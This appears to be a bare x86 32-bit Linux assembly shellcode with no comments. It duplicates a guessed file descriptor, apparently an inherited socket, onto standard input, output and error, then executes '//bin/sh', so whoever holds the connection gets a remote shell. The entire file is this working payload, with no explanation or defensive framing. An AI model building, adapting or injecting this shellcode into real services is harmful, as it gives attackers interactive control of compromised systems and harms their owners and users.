section .text

global main:
main:
	push 0x2
	pop ebx
	push 0x29
	pop eax
	int 0x80
	inc eax
	mov esi, eax 
	xor ecx, ecx
	push esi
	pop ebx
loop:
	push 0x3f
	pop eax
	int 0x80
	inc ecx
	cmp cl, 0x3
	jne loop
	push byte 0xb
	pop eax
	cdq
	push edx
	xor esi, esi
	push esi
	push dword 0x68732f6e
	push dword 0x69622f2f
	mov ebx, esp
	xor ecx, ecx
	int 0x80

